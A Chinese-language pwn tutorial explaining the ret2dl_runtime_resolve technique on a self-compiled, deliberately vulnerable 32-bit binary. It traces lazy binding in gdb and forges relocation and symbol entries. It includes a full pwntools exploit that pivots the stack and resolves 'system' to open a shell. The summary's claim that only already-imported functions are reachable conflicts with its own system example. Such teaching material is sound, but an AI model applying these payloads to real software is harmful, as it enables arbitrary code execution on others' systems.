---
title: "ret2dl_runtime_resolve"
description: "延迟绑定可以被劫持：伪造 reloc_index、r_info 与符号名，让解析器把任意函数解析成你要的那个。"
pubDate: 2025-11-24
category: pwn
tags: [ret2dl]
---

## 前置

ret2libc 里绕不开延迟绑定（lazy binding）：动态链接器为了缩短启动时间，把函数地址的绑定推迟到第一次调用时才做（细节见[这篇分析](https://yjy123123.github.io/2021/12/06/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/)）。

这个过程同样可以被劫持，让函数地址绑定成另一个函数。

## 原理

下文用 `ret2dl` 代指 `ret2dl_runtime_resolve`。

32 位和 64 位在参数传递上有差异，这里只讲 32 位的做法。

## 源码

```C
#include<stdio.h>

void vuln()
{
    char content[0x100];
    read(0, content, 0x200);
}

int main(){
    vuln();
    return 0;
}
```

编译命令：`gcc -m32 -o example example.c -no-pie -fno-stack-protector -w`

## 绑定流程

在 `0x804918d`（`read` 的调用点）下断点，一路 `si` 跟进去，能看到它先跳到 `read` 的 GOT 项里存的地址；第一次调用时那里面是 `read@plt+6`：

```
 ► 0x8049040  <read@plt>                  jmp    dword ptr [read@got[plt]]   <read@plt+6>
    ↓
   0x8049046  <read@plt+6>                push   8
   0x804904b  <read@plt+11>               jmp    0x8049020                   <0x8049020>
    ↓
   0x8049020                              push   dword ptr [_GLOBAL_OFFSET_TABLE_+4]
   0x8049026                              jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+8] <_dl_runtime_resolve>
```

其过程为 `read@plt -> [read@got] = read@plt+6 -> push reloc_index -> push link_map -> _dl_runtime_resolve` ，该过程中的 reloc_index （上文中的 8 ）和 link_map （上文中的 dword ptr [\_GLOBAL_OFFSET_TABLE_+4]) 就是确定所绑定的函数信息的。这两个值分别是什么？8 是这条符号信息在 `.rel.plt` 中的下标（reloc_index）。

以 `read` 为例，`0x080482FC - 0x080482F4 = 8`：

```
LOAD:080482F4 ; ELF JMPREL Relocation Table
LOAD:080482F4                 Elf32_Rel <804C000h, 107h> ; R_386_JMP_SLOT __libc_start_main
LOAD:080482FC                 Elf32_Rel <804C004h, 207h> ; R_386_JMP_SLOT read
```

### 四段 payload 的共同骨架

后面每一步都基于同一段骨架：先溢出盖掉返回地址，用 `read` 把第二段 payload 读进 `tar_stack`，再用 `leave; ret` 把栈迁过去。四段的差别只在第二段 payload 里补了哪些字段，所以骨架先给一次，后面每步只说改哪几行。

```python
from pwn import *

context.binary = elf = ELF('./example')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

libc = elf.libc

script = '''
b *0x804919A
'''
io = process(elf.path)
gdb.attach(io, script)

tar_stack = 0x804C800      # 伪造的结构体放在这里
vuln_skip_rbp = 0x8049169
leave_ret = 0x8049199
analyse_func = 0x8049020   # PLT0：push link_map; jmp _dl_runtime_resolve
offset = 0x108

rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

# 第一段：溢出 + 栈迁移，把第二段 payload 读进 tar_stack
payload  = b'a' * offset
payload += p32(tar_stack - 4)
payload += p32(elf.plt['read'])
payload += p32(leave_ret)
payload += p32(0)          # stdin
payload += p32(tar_stack)
payload += p32(0x600)      # size
io.sendline(payload)

pause()

# 第二段：跳到 PLT0，手动走一遍解析流程
payload  = p32(analyse_func)
payload += p32(reloc_index)                  # ← 下面每步改的就是这里往下几行
payload += p32(0xdeadbeef)                   # 假的返回地址
payload += p32(0) + p32(tar_stack) + p32(0x200)   # 解析完要调的函数与它的参数
io.sendline(payload)

io.interactive()
```

### 伪造 reloc_index

`reloc_index` 指向 `.rel.plt` 里的哪一条。真的 `read` 是第 8 条，我们把它改到 `tar_stack` 附近，再在紧跟着的位置铺一个假的 `ELF32_Rel`：

```python
reloc_index = tar_stack - rel_plt + 0x18
```

### 伪造 ELF32_Rel 结构体的值

```C
typedef struct{
  Elf32_Addr r_offset;
  Elf32_Word r_info;
}Elf32_Rel
```

第一个字段 `r_offset` 是解析结果（函数真实地址）要写入的地方，正常是对应函数的 GOT 项，伪造时可以继续用，也可以换成任意可写地址。重点在第二个字段 `r_info`。

```python
r_info = (((tar_stack - dynsym + 0x2C) // 0x10) << 8) | 0x7
# (tar_stack - dynsym + 0x2C) % 0x10 == 0，符号表项必须 16 字节对齐

payload += p32(0x804C004) + p32(r_info)      # 假的 ELF32_Rel
```

`r_info` 低 8 位是重定位类型：x86 上用 7（`R_386_JMP_SLOT`），也就是示例里 `0x207` 的 `07`；除低 8 位以外的部分是符号在 `.dynsym` 里的下标，这里为 2。

```text
LOAD:0804820C ; ELF Symbol Table
LOAD:0804820C                 Elf32_Sym <0>
LOAD:0804821C                 Elf32_Sym <offset aLibcStartMain - offset unk_804825C, 0, 0, 12h, 0, 0> ; "__libc_start_main"
LOAD:0804822C                 Elf32_Sym <offset aRead - offset unk_804825C, 0, 0, 12h, 0, 0> ; "read"
```

从 0 开始数，下标 1 是 `__libc_start_main`、2 是 `read`，所以 `0x207` 里的 2 正对应 `read`。伪造时同样把下标填大，指向栈上自己铺的那一项。

### 伪造 ELF32_Sym 结构体的值

```C
typedef struct
{
  Elf32_Word    st_name;
  Elf32_Addr    st_value;
  Elf32_Word    st_size;
  unsigned char st_info;
  unsigned char st_other;
  Elf32_Section st_shndx;
}Elf32_Sym;
```

对照真的符号表项，只有 `st_name` 和 `st_info` 非零，其余保持 0 即可。`st_name` 是函数名在字符串表里的偏移，`st_info` 高 4 位是绑定信息、低 4 位是符号类型。

```python
st_name = tar_stack - dynstr + 0x3C

payload += b'k' * 12        # 对齐填充
payload += p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)  # 假的 ELF32_Sym
payload += b'read\0'
```

这里只需伪造 `st_name`，让解析器到栈上读我们写的字符串；`st_info` 的 `0x12` 表示"全局函数"。

### 劫持成目标函数

走完这一遍就能看出：解析器最后是按字符串去查函数的。把这个字符串换成目标函数名，解析结果就成了目标函数。

下面把四步合起来，换成 `system("/bin/sh")`：

```python
from pwn import *

context.binary = elf = ELF('./example')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

libc = elf.libc

script = '''
b *0x804919A
'''
io = process(elf.path)
gdb.attach(io, script)

tar_stack = 0x804C800
vuln_skip_rbp = 0x8049169
leave_ret = 0x8049199
analyse_func = 0x8049020

rel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr
dynsym = elf.get_section_by_name('.dynsym').header.sh_addr
dynstr = elf.get_section_by_name('.dynstr').header.sh_addr

offset = 0x108

# 第一段：溢出 + 栈迁移
payload  = b'a' * offset
payload += p32(tar_stack - 4)
payload += p32(elf.plt['read'])
payload += p32(leave_ret)
payload += p32(0)
payload += p32(tar_stack)
payload += p32(0x600)
io.sendline(payload)

reloc_index = tar_stack - rel_plt + 0x18
r_info = (((tar_stack - dynsym + 0x2C) // 0x10) << 8) | 0x7
st_name = tar_stack - dynstr + 0x3C

pause()

sh_addr = tar_stack + 0x44     # "/bin/sh" 在栈上的位置

# 第二段：伪造 Rel + Sym + 字符串
payload  = p32(analyse_func)
payload += p32(reloc_index)
payload += p32(0xdeadbeef)
payload += p32(sh_addr) + b'k' * 8                    # system 的参数
payload += p32(0x804C004) + p32(r_info)               # 假的 ELF32_Rel
payload += b'k' * 12
payload += p32(st_name) + p32(0) + p32(0) + p8(0x12) + p8(0) + p16(0)  # 假的 ELF32_Sym
payload += b'system\0\0'
payload += b'/bin/sh\0'

io.sendline(payload)

io.interactive()
```

## 小结

`ret2dl` 本身不难理解，好处是不依赖 libc 就能调到程序已导入的任意函数。

64 位的思路一致，区别在 `r_info` 变成 64 位（并且符号下标在高位）、重定位表换成 `.rela.plt`、多了一个 `r_addend` 字段，可以照着这条链路自己走一遍。

## 参考文献

- [延迟绑定过程分析](https://yjy123123.github.io/2021/12/06/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/)
- [ret2dlresolve 小记](https://ltfa1l.top/2024/06/05/system/StackOverflow/ret2dlresolve/)
